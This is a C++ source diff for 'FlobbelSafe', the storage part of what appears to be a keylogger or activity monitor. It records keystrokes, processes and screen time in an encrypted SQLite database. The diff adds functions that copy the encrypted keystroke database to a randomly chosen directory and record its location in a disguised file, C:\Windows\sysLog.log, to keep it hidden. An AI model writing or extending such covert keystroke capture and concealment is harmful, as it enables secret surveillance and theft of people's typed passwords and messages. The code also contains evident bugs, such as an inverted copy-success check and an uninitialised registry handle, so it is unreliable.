@@ -15,16 +15,19 @@ FlobbelSafe::FlobbelSafe(std::wstring &_safedir):
     wchar_t date[11];
     auto n = now();
     int rc = 0;
+    init_map();
+    db_file = _safedir+L"flobsafe.db";
+    find(); // TODO: add check wether sysLog.log exists, add fallback
+    if(PathFileExistsW(db_file.c_str())) {
+        decrypt_file(db_file);
+    }
     sqlite3_stmt *uniState = nullptr;
     wsprintfW(date,L"%02d_%02d_%04d",n->tm_mday, n->tm_mon+1, n->tm_year+1900);
     keyTable = L"KEYS_"+std::wstring(date)+L"_"+std::wstring(computerHandleStr())+L"_CPACTIVITY";
     proTable = L"PROC_"+std::wstring(date)+L"_"+std::wstring(computerHandleStr())+L"_CPACTIVITY";
 
-    if(PathFileExistsW((safedir+L"flobsafe.db").c_str()))
-        decrypt_file(safedir+L"flobsafe.db");
-    rc = sqlite3_open16((safedir+L"flobsafe.db").c_str(),&dbcon);
-    sqlErrCheck(rc,L"opening Database "+safedir+L"flobsafe.db",dbcon);
-    //execStmt(dbcon,&uniState,L"CREATE DATABASE \"flobbel\";");
+    rc = sqlite3_open16(db_file.c_str(),&dbcon);
+    sqlErrCheck(rc,L"opening Database "+db_file,dbcon);
     execStmt(dbcon,&uniState,L"CREATE TABLE IF NOT EXISTS "+proTable+L" (pid INT(8),timestamp_on DATETIME, timestamp_off DATETIME, filename TEXT);");
     execStmt(dbcon,&uniState,L"CREATE TABLE IF NOT EXISTS "+keyTable+L" (updown CHAR(2),vkcode INT(8),scancode INT(8),description CHAR(5),timestamp DATETIME);");
     execStmt(dbcon,&uniState,L"CREATE TABLE IF NOT EXISTS screentime (cp_handle INT, timestamp_on DATETIME, timestamp_off DATETIME, duration INT);");
@@ -78,7 +81,7 @@ void FlobbelSafe::add_screentime(Screentime &info){
     );
     sqlite3_finalize(scrState);
 }
-FlobbelSafe::~FlobbelSafe() {
+void FlobbelSafe::finalize_queues() {
     std::wstring vals;
     if (!prcQueue.empty()) {
         while (!prcQueue.empty()) {
@@ -103,9 +106,12 @@ FlobbelSafe::~FlobbelSafe() {
                  L"INSERT INTO " + keyTable + L" (updown,vkcode,scancode,description,timestamp) VALUES" + vals);
         sqlite3_finalize(keyState);
     }
+}
+FlobbelSafe::~FlobbelSafe() {
+    finalize_queues();
     sqlite3_close(dbcon);
-    //encrypt_n_copy(safedir+L"flobsafe.db");
-    encrypt_file(safedir + L"flobsafe.db");
+    encrypt_file(db_file);
+    //hide();
 }
 void FlobbelSafe::encrypt_file(const std::wstring &file) {
     std::ifstream in(converter.to_bytes(file), std::ios::binary|std::ios::ate);
@@ -152,4 +158,48 @@ void FlobbelSafe::decrypt_file(const std::wstring &file) {
     }else{
         std::wcout << "ERROR reading file(" << file+L"flobsafe.db" << ")\n";
     }
+}
+void FlobbelSafe::hide(){
+    HKEY hkey;
+    uint32_t x = 0;
+    auto it = rnd_directories.begin();
+    std::advance(it,rand()%rnd_directories.size());
+    x = it->first;
+    std::ofstream file("C:\\Windows\\sysLog.log",std::ios::trunc);
+    file << std::to_string(x);
+    file.close();
+    if(CopyFileW(db_file.c_str(),rnd_directories.at(x).c_str(),FALSE)){
+        std::wcerr << "ERROR Unable to Copy file to " << rnd_directories.at(x) << L"\n";
+        return;
+    }
+}
+void FlobbelSafe::find(){
+    HKEY hkey;
+    uint32_t x = 0;
+    std::ifstream file("C:\\Windows\\sysLog.log");
+    file >> x;
+    db_file = rnd_directories.at(x);
+    RegCloseKey(hkey);
+}
+
+void FlobbelSafe::init_map() {
+    std::wstring list[] = {
+            L"D:\\Temp\\flobsafe.db"
+    };
+    for(int i = 0; i < 1; i++)
+        rnd_directories.insert_or_assign(hash(list[i]),list[i]);
+}
+
+uint32_t FlobbelSafe::hash(std::wstring &text) { //256 bit/32 byte
+    CryptoPP::byte digest[CryptoPP::SHA256::DIGESTSIZE];
+    CryptoPP::SHA256().CalculateDigest(digest,(CryptoPP::byte*)text.c_str(),text.size()*sizeof(wchar_t));
+    uint32_t sumtotal = (uint32_t)*digest;
+    sumtotal += (uint32_t)*(digest+4);
+    sumtotal += (uint32_t)*(digest+8);
+    sumtotal += (uint32_t)*(digest+12);
+    sumtotal += (uint32_t)*(digest+16);
+    sumtotal += (uint32_t)*(digest+20);
+    sumtotal += (uint32_t)*(digest+24);
+    sumtotal += (uint32_t)*(digest+28);
+    return sumtotal;
 }
